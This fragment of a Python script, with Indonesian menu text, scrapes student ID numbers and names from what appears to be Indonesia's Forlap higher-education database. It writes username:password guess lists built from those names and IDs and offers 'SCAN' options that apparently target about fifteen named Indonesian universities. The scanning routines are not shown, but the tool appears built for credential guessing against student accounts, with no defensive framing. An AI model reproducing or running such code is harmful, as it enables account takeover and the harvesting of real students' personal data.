					o_.write(x[0].lower()+x[1].lower()+':'+x[1].lower()+cok+'\n')
					o_.write(x[0].lower()+x[1].lower()+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
	
	else:
		exit(f"{red}Jangan lupa udud cuy{off}")
		
	
		
def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		xtc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _

def done(_2):
	print(f"{green}[{white}✓{green}]{off}Hasil sudah tersimpan {green} {off}")
			
			
			

		
		
		
def main():
		print(logo + "\n" + f"\n{green}[{off}01{green}]{off} FORLAP DUMPER ")
		print(f"{green}[{off}02{green}]{off} SCAN UII ")
		print(f"{green}[{off}03{green}]{off} SCAN UNSYIAH ")
		print(f"{green}[{off}04{green}]{off} SCAN UNUSA ")
		print(f"{green}[{off}05{green}]{off} SCAN USD ")
		print(f"{green}[{off}06{green}]{off} SCAN UNSRAT ")
		print(f"{green}[{off}07{green}]{off} SCAN UPI ")
		print(f"{green}[{off}08{green}]{off} SCAN UAJY ")
		print(f"{green}[{off}09{green}]{off} SCAN UB ")
		print(f"{green}[{off}10{green}]{off} SCAN ITB ")
		print(f"{green}[{off}11{green}]{off} SCAN UI ")
		print(f"{green}[{off}12{green}]{off} SCAN IPB ")
		print(f"{green}[{off}13{green}]{off} SCAN UNHAS ")
		print(f"{green}[{off}14{green}]{off} SCAN UAD ")
		print(f"{green}[{off}15{green}]{off} SCAN UNTAN ")
		print(f"{green}[{off}16{green}]{off} SCAN UGM ")
		select = input(f"\n{green}[{off}?{green}]{off} Pilih > ")
		if select == '1':
			asu()
		elif select == '2':
			uiip()
		elif select == '3':
			unsyiahp()
		elif select == '4':
			unusap()
		elif select == '5':
			usdp()
		elif select == '6':
			unsratp()
		elif select == '7':
			upip()
		elif select == '8':
			uajyp()
		elif select == '9':
			ubp()
		elif select == '10':
			itbp()
		elif select == '11':
	   	 uip()
		elif select == '12':
			ipbp()
		elif select == '13':
			unhasp()
		elif select == '14':
			uadp()
		elif select == '15':
			untanp()
		elif select == '16':
			ugmp()
			
	   	 
	
	   	 
	
	
		else:
			exit()



if __name__=='__main__':
        p = ThreadPool()
        openup()
        mp_handler()
        p.terminate()
        p.join()
